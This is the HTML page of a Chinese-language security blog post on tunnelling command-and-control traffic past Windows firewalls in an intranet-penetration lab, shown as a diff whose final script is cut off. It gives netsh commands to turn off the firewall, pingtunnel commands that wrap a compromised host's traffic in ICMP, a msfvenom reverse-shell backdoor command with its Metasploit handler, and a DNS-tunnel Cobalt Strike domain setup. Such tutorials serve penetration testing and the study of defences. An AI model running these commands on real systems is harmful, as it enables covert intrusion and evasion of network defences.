@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ssh只能信息搜集，icmp可以上线c2，udp、tcp主要是用转发数据 防火墙策略-入站规则&amp;出站规则&amp;自定义1、防火墙默认入站&amp;出站策略 2、防火墙自定义入站&amp;出站策略 内网域防火墙同步策略： 操作：组策略管理-域-创建GPO链接-防火墙设置 更新策略：强制&amp;命令&amp;重启 命令：gpupdate&#x2F;force 限制端口分为：入站限制">
+<meta property="og:type" content="article">
+<meta property="og:title" content="防火墙开启状态下隧道搭建(一)">
+<meta property="og:url" content="https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="ssh只能信息搜集，icmp可以上线c2，udp、tcp主要是用转发数据 防火墙策略-入站规则&amp;出站规则&amp;自定义1、防火墙默认入站&amp;出站策略 2、防火墙自定义入站&amp;出站策略 内网域防火墙同步策略： 操作：组策略管理-域-创建GPO链接-防火墙设置 更新策略：强制&amp;命令&amp;重启 命令：gpupdate&#x2F;force 限制端口分为：入站限制">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553825369-dde60bfd-547d-4214-b6c5-66c55ee412b3.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553806868-d105683c-fb38-4fcc-800b-93d5c49955d9.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553800329-a703c438-8212-412a-ac8d-a091cc73da41.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553790285-d85f3421-6255-46a4-93e1-c6f5dc7d64db.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740561137428-24aa4c4d-9b44-4bbc-b283-2b19cdf445ca.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574068787-31e27500-bd56-4840-9e1e-d00d2e8de4fc.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574983464-3ea7dcc8-1475-40b1-8257-3884efe2de05.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574120561-3bb62688-6856-4ce5-a532-03e86f133ccd.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740576856688-413f6eaf-f123-4b69-9663-851b0f1a9506.png">
+<meta property="article:published_time" content="2025-01-04T15:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-06T10:14:14.524Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="域">
+<meta property="article:tag" content="隧道">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553825369-dde60bfd-547d-4214-b6c5-66c55ee412b3.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>防火墙开启状态下隧道搭建(一)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/06/%E5%9F%9F/%E9%9A%A7%E9%81%932/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&text=防火墙开启状态下隧道搭建(一)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&title=防火墙开启状态下隧道搭建(一)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&is_video=false&description=防火墙开启状态下隧道搭建(一)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=防火墙开启状态下隧道搭建(一)&body=Check out this article: https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&title=防火墙开启状态下隧道搭建(一)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&title=防火墙开启状态下隧道搭建(一)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&title=防火墙开启状态下隧道搭建(一)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&title=防火墙开启状态下隧道搭建(一)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&name=防火墙开启状态下隧道搭建(一)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&t=防火墙开启状态下隧道搭建(一)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%96%E7%95%A5-%E5%85%A5%E7%AB%99%E8%A7%84%E5%88%99-%E5%87%BA%E7%AB%99%E8%A7%84%E5%88%99-%E8%87%AA%E5%AE%9A%E4%B9%89"><span class="toc-number">1.</span> <span class="toc-text">防火墙策略-入站规则&amp;出站规则&amp;自定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A6%E9%9A%A7%E9%81%93%E5%89%8D%E5%85%88%E6%90%9E%E6%B8%85%E6%A5%9A"><span class="toc-number">2.</span> <span class="toc-text">学隧道前先搞清楚</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE-%E5%88%A4%E6%96%AD%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">协议 判断命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%A5%E7%AB%99%E5%8F%AA80-%E5%87%BA%E7%AB%99%E5%8F%AA%E6%94%BEICMP%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">开防火墙入站只80&amp;出站只放ICMP：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%A5%E7%AB%99%E5%8F%AA80-%E5%87%BA%E7%AB%99%E5%8F%AA%E6%94%BEDNS%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">开防火墙入站只80&amp;出站只放DNS：</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        防火墙开启状态下隧道搭建(一)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-04T15:51:29.000Z" class="dt-published" itemprop="datePublished">2025-01-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>, <a class="p-category" href="/tags/%E9%9A%A7%E9%81%93/" rel="tag">隧道</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553825369-dde60bfd-547d-4214-b6c5-66c55ee412b3.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553806868-d105683c-fb38-4fcc-800b-93d5c49955d9.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553800329-a703c438-8212-412a-ac8d-a091cc73da41.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553790285-d85f3421-6255-46a4-93e1-c6f5dc7d64db.png"></p>
+<p>ssh只能信息搜集，icmp可以上线c2，udp、tcp主要是用转发数据</p>
+<h3 id="防火墙策略-入站规则-出站规则-自定义"><a href="#防火墙策略-入站规则-出站规则-自定义" class="headerlink" title="防火墙策略-入站规则&amp;出站规则&amp;自定义"></a>防火墙策略-入站规则&amp;出站规则&amp;自定义</h3><p>1、防火墙默认入站&amp;出站策略</p>
+<p>2、防火墙自定义入站&amp;出站策略</p>
+<p>内网域防火墙同步策略：</p>
+<p>操作：组策略管理-域-创建GPO链接-防火墙设置</p>
+<p>更新策略：强制&amp;命令&amp;重启</p>
+<p>命令：gpupdate&#x2F;force</p>
+<p>限制端口分为：入站限制端口、出站限制端口、出入站均限制端口。</p>
+<p>入站限制端口，出站未限制端口，使用反向连接。</p>
+<p>出站限制端口，入站未限制端口，使用正向连接。</p>
+<p>出入站均限制端口，使用端口绕过进行连接，建议配合反向连接。</p>
+<p>限制协议分为：</p>
+<p>入站限制、出站限制、出入均限制，限制又分为：单协议限制、多协议限制、全部限制。</p>
+<p>入站限制：</p>
+<p>单协议限制，使用其它协议或者反向连接绕过。（隧道技术）</p>
+<p>多协议限制，使用未被限制的协议或者反向连接绕过。（隧道技术）</p>
+<p>全部协议限制，使用放弃或者反向连接绕过，但正常不会将所以协议都封闭的。</p>
+<p>出站限制：</p>
+<p>参考上面使用正向连接绕过。</p>
+<p>出入均限制：</p>
+<p>单协议限制，使用其它协议绕过。（隧道技术）</p>
+<p>多协议限制，使用未被限制的协议绕过。（隧道技术）</p>
+<p>全部协议限制，使用放弃绕过，但正常不会将所以协议都封闭的。</p>
+<p>单层目标机防火墙开启上线解决方案：</p>
+<p>1、命令关闭防火墙</p>
+<p>2、反向中转连接上线</p>
+<p>3、利用隧道技术上线（规则决定）</p>
+<p>单层跳板机防火墙开启上线解决方案：</p>
+<p>1、命令关闭防火墙</p>
+<p>2、正向监听连接上线</p>
+<p>3、利用隧道技术上线（规则决定）</p>
+<p>双层防火墙开启上线解决方案：</p>
+<p>1、命令关闭防火墙</p>
+<p>2、利用隧道技术上线（规则决定）</p>
+<p>防火墙实验（适用场景）：</p>
+<p>1、内网无域环境下</p>
+<p>2、内网有域环境下（强制策略同步）</p>
+<p>Windows防火墙命令：</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tomtellyou/p/16300557.html">https://www.cnblogs.com/tomtellyou/p/16300557.html</a></p>
+<p>查看当前防火墙状态：netsh advfirewall show allprofiles</p>
+<p>关闭防火墙：netsh advfirewall set allprofiles state off</p>
+<p>开启防火墙：netsh advfirewall set allprofiles state on</p>
+<p>恢复初始防火墙设置：netsh advfirewall reset</p>
+<p>启用桌面防火墙: netsh advfirewall set allprofiles state on</p>
+<p>设置默认输入和输出策略：netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</p>
+<p>如果设置为拒绝使用blockinbound,blockoutbound</p>
+<h3 id="学隧道前先搞清楚"><a href="#学隧道前先搞清楚" class="headerlink" title="学隧道前先搞清楚"></a>学隧道前先搞清楚</h3><p>0、不是有互联网才叫出网（能和其他计算机正常通讯就算出网）</p>
+<p>1、C2常见上线采用的协议</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740561137428-24aa4c4d-9b44-4bbc-b283-2b19cdf445ca.png"></p>
+<p>2、常见的协议层出网判断</p>
+<p>常用的隧道技术：</p>
+<p>利用各种隧道技术，以网络防火墙允许的协议，</p>
+<p>绕过网络防火墙的封锁，实现访问被封锁的目标网络</p>
+<p>网络层：IPv6 隧道、ICMP 隧道</p>
+<p>传输层：TCP 隧道、UDP 隧道、常规端口转发</p>
+<p>应用层：SSH 隧道、HTTP&#x2F;S 隧道、DNS 隧道</p>
+<h4 id="协议-判断命令"><a href="#协议-判断命令" class="headerlink" title="协议 判断命令"></a>协议 判断命令</h4><p>ICMP ping ip or domain</p>
+<p>HTTP curl ip or domain</p>
+<p>SSH ssh ip or domain</p>
+<p>DNS nslookup domain</p>
+<p>TCP telnet ip port</p>
+<p>注意目标一定要是正常的目标</p>
+<h3 id="开防火墙入站只80-出站只放ICMP："><a href="#开防火墙入站只80-出站只放ICMP：" class="headerlink" title="开防火墙入站只80&amp;出站只放ICMP："></a>开防火墙入站只80&amp;出站只放ICMP：</h3><p>icmp可用于文件打印和共享</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574068787-31e27500-bd56-4840-9e1e-d00d2e8de4fc.png"></p>
+<p>ICMP 通过 PING 命令访问远程计算机，建立 ICMP 隧道，将 TCP&#x2F;UDP 数据封装到 ICMP 的 PING 数据包中，从而穿过防火墙，防火墙一般不会屏蔽 PING 数据包，实现不受限制的访问。</p>
+<p>应用场景：80为入口权限点，ICMP为上线突破口</p>
+<p>适用场景：目标入站正向被拦截，出站有ICMP出网</p>
+<p>排查出网协议：curl nslookup ping等命令</p>
+<p>拿到服务器权限后，先ping判断icmp能出</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+<p>CS:</p>
+<p>kali攻击机上起服务</p>
+<p>.&#x2F;pingtunnel -typeserver</p>
+<p>将本地6666流量转发到192.168.139.141:777上面（tcp流量封装成icmp转发）</p>
+<p>沦陷机器执行</p>
+<p>pingtunnel -typeclient -l:6666 -s 192.168.139.141 -t 192.168.139.141:7777 -tcp 1 -noprint 1 -nolog 1</p>
+<p>监听器配置：</p>
+<p>127.0.0.1 6666（后门生成）</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574983464-3ea7dcc8-1475-40b1-8257-3884efe2de05.png"></p>
+<p>192.168.139.141 7777（监听上线）</p>
+<p>同理kali攻击机也加上</p>
+<p>生成cs后门时，生成127.0.0.1:6666的后门</p>
+<p>从攻击机上流量全是icmp流量</p>
+<p>MSF:</p>
+<p>生成后门：</p>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;127.0.0.1LPORT&#x3D;3333 -f exe -o msf.exe</p>
+<p>隧道：</p>
+<p>pingtunnel -typeclient -l:3333 -s 192.168.139.141 -t 192.168.139.141:3344 -tcp 1 -noprint 1 -nolog 1</p>
+<p>监听器配置：</p>
+<p>msfconsole</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>set lhost 0.0.0.0</p>
+<p>set lport 3344</p>
+<p>run</p>
+<h3 id="开防火墙入站只80-出站只放DNS："><a href="#开防火墙入站只80-出站只放DNS：" class="headerlink" title="开防火墙入站只80&amp;出站只放DNS："></a>开防火墙入站只80&amp;出站只放DNS：</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574120561-3bb62688-6856-4ce5-a532-03e86f133ccd.png"></p>
+<p>应用场景：80为入口权限点，DNS为上线突破口</p>
+<p>适用场景：目标入站正向被拦截，出站有DNS出网</p>
+<p>排查出网协议：curl nslookup ping等命令</p>
+<p>CS:</p>
+<p>-域名申请及配置</p>
+<p>-监听器创建及配置</p>
+<p>-后门绑定监听器生成</p>
+<p>搞个域名绑定到公网服务器主机上去，在公网服务器起c2就行了</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740576856688-413f6eaf-f123-4b69-9663-851b0f1a9506.png"></p>
+<p>ns8.calm.com-&gt;c2.calm.com</p>
+<p>ns9.calm.com-&gt;c2.calm.com</p>
+<p>c2.calm.com-&gt;公网服务器ip</p>
+<p>上线之后会发现cs页面比较慢，此时在cs命令行执行下面命令</p>
+<p>checkin</p>
+<p>mode dns-txt</p>
+<p>MSF:</p>
+<p>pro版本的reverse_dns模块</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/424351656">https://zhuanlan.zhihu.com/p/424351656</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/vspiders/article/details/78999624">https://blog.csdn.net/vspiders/article/details/78999624</a></p>
+<p>msf慢慢被淘汰了，因为cs有心跳包，msf是session很容易被杀</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%96%E7%95%A5-%E5%85%A5%E7%AB%99%E8%A7%84%E5%88%99-%E5%87%BA%E7%AB%99%E8%A7%84%E5%88%99-%E8%87%AA%E5%AE%9A%E4%B9%89"><span class="toc-number">1.</span> <span class="toc-text">防火墙策略-入站规则&amp;出站规则&amp;自定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A6%E9%9A%A7%E9%81%93%E5%89%8D%E5%85%88%E6%90%9E%E6%B8%85%E6%A5%9A"><span class="toc-number">2.</span> <span class="toc-text">学隧道前先搞清楚</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE-%E5%88%A4%E6%96%AD%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">协议 判断命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%A5%E7%AB%99%E5%8F%AA80-%E5%87%BA%E7%AB%99%E5%8F%AA%E6%94%BEICMP%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">开防火墙入站只80&amp;出站只放ICMP：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%A5%E7%AB%99%E5%8F%AA80-%E5%87%BA%E7%AB%99%E5%8F%AA%E6%94%BEDNS%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">开防火墙入站只80&amp;出站只放DNS：</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&text=防火墙开启状态下隧道搭建(一)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&title=防火墙开启状态下隧道搭建(一)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&is_video=false&description=防火墙开启状态下隧道搭建(一)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=防火墙开启状态下隧道搭建(一)&body=Check out this article: https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&title=防火墙开启状态下隧道搭建(一)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&title=防火墙开启状态下隧道搭建(一)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&title=防火墙开启状态下隧道搭建(一)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&title=防火墙开启状态下隧道搭建(一)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&name=防火墙开启状态下隧道搭建(一)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/&t=防火墙开启状态下隧道搭建(一)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
